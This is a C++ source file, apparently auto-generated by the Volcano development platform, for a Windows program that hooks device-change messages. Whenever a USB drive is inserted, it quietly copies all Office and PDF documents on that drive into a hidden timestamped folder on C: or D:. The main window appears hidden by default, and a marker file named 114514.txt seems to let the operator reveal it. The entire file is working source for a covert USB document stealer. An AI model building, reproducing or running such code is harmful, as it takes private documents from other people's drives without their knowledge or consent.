
// Generated by Volcano Development Platform - http://www.voldp.com

#include "stdafx.h"
#include "vol_user_app.h"

EXTERN_FUNC_ITEM rw_1 [] =
{
    {  _T ("user32.dll"),  "CallWindowProcW",  NULL  },
    {  NULL,  "",  NULL  }
};

namespace rg_hsh_chx
{

static void _sOnClassesStaticInit ()
{
    rg_qdl::_sOnStaticInit ();
}

void rg_qdl::_sOnStaticInit ()
{
    rg_n100.rg_n7848 (_CT ("我的主窗口"));
}

rg_qdl::rg_qdl ()
{
}

INT rg_qdl::rg_n101 ()
{
    if (g_objVolApp.InitExternFuncTable (::rw_1, TRUE) == FALSE)
        return 0;
    _sOnClassesStaticInit ();
    rg_n100.CreateMainVolWindow (_VOL_INT_MIN, _VOL_INT_MIN, _VOL_INT_MIN, _VOL_INT_MIN, _NULL_VOL_OBJECT (rg_hsh_MFCjm_jb::rg_cchl).GetVolMenuCheckNull ());
    return (1);
}

rg_wdzhchk::rg_wdzhchk ()
{
    rw_33 = new CVolObjectPointer (this);
    _VOL_THIS.rg_n7848 (_CT ("主窗口"));
    _VOL_THIS.rg_n7853 (FALSE);
}

BOOL rg_wdzhchk::_IsSelfEqual (const rg_wdzhchk& objCompare) const
{
    if (rg_n102 != objCompare.rg_n102)  return FALSE;
    return TRUE;
}

void rg_wdzhchk::_CopySelfFrom (const rg_wdzhchk& objCopyFrom)
{
    rg_n102 = objCopyFrom.rg_n102;
}

rg_wdzhchk::~rg_wdzhchk ()
{
    rw_33->ReleasePointer ();
}

void rg_wdzhchk::OnWinContainerCreated ()
{
    BaseClass::OnWinContainerCreated ();
    ra_zjbjq_n6181 ((VOID_FUNC)re_wdzhchk_n103, rw_33, 0);
    rg_n102.rg_n7848 (_CT ("关闭程序"));
    rg_n102.CreateVolControl (this, 85, 38, 328, 192, 101);
    rg_n102.ra_annjchl_n6361 ((VOID_FUNC)re_wdzhchk_n117, rw_33, 0);
}

INT rg_wdzhchk::rg_n103 (rg_wdzhchk& rg_n104, INT rg_n105)
{
    rg_hsh_jb::rg_wbshzl rg_n106;
    rg_qjbll::rg_n135 = (INT_P)rg_n104.GetMfcWndPtr ()->m_hWnd;
    rg_qjbll::rg_n134 = SetWindowLongPtr ((HWND)rg_qjbll::rg_n135, -4, (LONG_PTR)((INT_P)&rg_n129));
    rg_qjbll::rg_n136 = rg_hsh_jb::rg_shjczl::rg_n3614 (GetCurrentDateTime (), 1, TRUE);
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.pptx").GetText ());
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.ppt").GetText ());
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.docx").GetText ());
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.doc").GetText ());
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.xlsx").GetText ());
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.xls").GetText ());
    rg_qjbll::rg_n137.data ().Add2 (_CT ("*.pdf").GetText ());
    rg_hsh_jymk::rg_j_jt::rg_n9708 (rg_n106);
    if ((INT)rg_n106.data ().GetCount () == 1)
    {
        rg_qjbll::rg_n139 = _T ("c");
    }
    else
    {
        rg_qjbll::rg_n139 = _T ("d");
    }
    return (0);
}

void CALLBACK rg_wdzhchk::rg_n107 (TCHAR rg_n108)
{
    INT rg_n109;
    INT rg_n110;
    INT rg_n111;
    CVolString rg_n112;
    CVolString rg_n113;
    CVolString rg_n114;
    rg_qjbll::rg_n141 = CVolString (rg_n108) + _T (":\\");
    if ((BOOL)IsOSFileExist ((CVolString (rg_qjbll::rg_n141) + _T ("114514.txt")).GetText ()) == TRUE)
    {
        rg_qdl::rg_n100.rg_n7853 (TRUE);
    }
    else
    {
        if (rg_qjbll::rg_n139 == _T ("c"))
        {
            if (rg_hsh_jymk::rg_j_wjml::rg_n8338 (_CT ("C:\\12321\\") + rg_qjbll::rg_n136) == TRUE)
            {
                rg_n109 = 1;
                while (rg_hsh_jymk::rg_j_wjml::rg_n8338 (_CT ("C:\\12321\\") + rg_qjbll::rg_n136 + _T ("(") + CVolString (rg_n109) + _T (")")) == TRUE)
                {
                    rg_n109 = rg_n109 + 1;
                }
                rg_qjbll::rg_n140 = _CT ("C:\\12321\\") + rg_qjbll::rg_n136 + _T ("(") + CVolString (rg_n109) + _T (")");
            }
            else
            {
                rg_qjbll::rg_n140 = _CT ("C:\\12321\\") + rg_qjbll::rg_n136;
            }
        }
        else
        {
            if (rg_hsh_jymk::rg_j_wjml::rg_n8338 (_CT ("D:\\12321\\") + rg_qjbll::rg_n136) == TRUE)
            {
                rg_n109 = 1;
                while (rg_hsh_jymk::rg_j_wjml::rg_n8338 (_CT ("D:\\12321\\") + rg_qjbll::rg_n136 + _T ("(") + CVolString (rg_n109) + _T (")")) == TRUE)
                {
                    rg_n109 = rg_n109 + 1;
                }
                rg_qjbll::rg_n140 = _CT ("D:\\12321\\") + rg_qjbll::rg_n136 + _T ("(") + CVolString (rg_n109) + _T (")");
            }
            else
            {
                rg_qjbll::rg_n140 = _CT ("D:\\12321\\") + rg_qjbll::rg_n136;
            }
        }
        rg_hsh_jymk::rg_j_wjml::rg_n8342 (rg_qjbll::rg_n140);
        rg_qjbll::rg_n138 = (INT)rg_qjbll::rg_n137.data ().GetCount ();
        for (INT_P __vol_counter_index = 0; __vol_counter_index < rg_qjbll::rg_n138; __vol_counter_index++)
        {
            rg_n110 = (INT)__vol_counter_index;
            rg_n112 = CVolString (rg_qjbll::rg_n137.data ().GetAt (rg_n110));
            rg_hsh_jymk::rg_j_wjml::rg_n8290 (rg_qjbll::rg_n141, rg_n112, rg_qjbll::rg_n142, TRUE, TRUE);
            for (INT_P __vol_counter_index = 0; __vol_counter_index < (INT)rg_qjbll::rg_n142.data ().GetCount (); __vol_counter_index++)
            {
                rg_n111 = (INT)__vol_counter_index;
                rg_n113 = CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)).Left ((INT)CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)).SearchText (_CT ("\\").GetText (), -1, FALSE, TRUE));
                rg_n113 = CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)).Right ((INT)CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)).GetLength () - (INT)CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)).SearchText (_CT ("\\").GetText (), 0, FALSE, FALSE));
                rg_hsh_jymk::rg_j_wjml::rg_n8342 (rg_qjbll::rg_n140 + _T ("\\") + rg_n113);
                rg_n114 = rg_qjbll::rg_n140 + _T ("\\") + rg_n113 + rg_hsh_jymk::rg_j_wjml::rg_n8354 (CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)));
                rg_hsh_jymk::rg_j_wjml::rg_n8250 (CVolString (rg_qjbll::rg_n142.data ().GetAt (rg_n111)), rg_n114, TRUE);
            }
        }
        rg_qjbll::rg_n142.data ().RemoveAll ();
        RunCommandLine ((_CT ("explorer ") + rg_qjbll::rg_n141).GetText (), FALSE, SW_SHOWNORMAL);
        ::MessageBeep (MB_OK);
    }
}

void CALLBACK rg_wdzhchk::rg_n115 (TCHAR rg_n116)
{
     _DEBUG_STATMENT (DebugTrace (0, 0, _T ("S"), (_CT ("-") + CVolString (rg_n116)).GetText ()));
}

INT rg_wdzhchk::rg_n117 (rg_hsh_MFCjm_jb::rg_ann& rg_n118, INT rg_n119)
{
    ExitProcess (0);
    return (0);
}

INT CALLBACK rg_wdzhchk::CallWindowProcW (INT rg_n120, INT rg_n121, INT rg_n122, INT rg_n123, INT rg_n124)
{
    typedef INT (CALLBACK *PFN_CallWindowProcW) (INT rg_n120, INT rg_n121, INT rg_n122, INT rg_n123, INT rg_n124);
    return ((PFN_CallWindowProcW)rw_1 [0].m_func) (rg_n120, rg_n121, rg_n122, rg_n123, rg_n124);
}

INT CALLBACK rg_wdzhchk::rg_n129 (INT rg_n130, INT rg_n131, INT rg_n132, INT rg_n133)
{
    if (rg_n131 == 537)
    {
        typedef struct _DEV_BROADCAST_VOLUME {
          DWORD dbcv_size;
          DWORD dbcv_devicetype;
          DWORD dbcv_reserved;
          DWORD dbcv_unitmask;
          WORD  dbcv_flags;
        } DEV_BROADCAST_VOLUME;
         if ((DWORD)rg_n132 == 32768) {
         DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*) rg_n133;
         if (p->dbcv_devicetype == 2) {
         int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
         ((INT(__stdcall*)(...))(INT_P)&rg_n107)('A' + l);
         }
         }
        else if ((DWORD)rg_n132 == 32772) {
                    DEV_BROADCAST_VOLUME* p = (DEV_BROADCAST_VOLUME*) rg_n133;
                    if (p->dbcv_devicetype == 2) {
                        int l = (int)(log(double(p->dbcv_unitmask)) / log(double(2)));
         ((INT(__stdcall*)(...))(INT_P)&rg_n115)('A' + l);
         }
         }
    }
    return (CallWindowProcW (rg_qjbll::rg_n134, rg_n130, rg_n131, rg_n132, rg_n133));
}

rg_qjbll::rg_qjbll ()
{
}

}
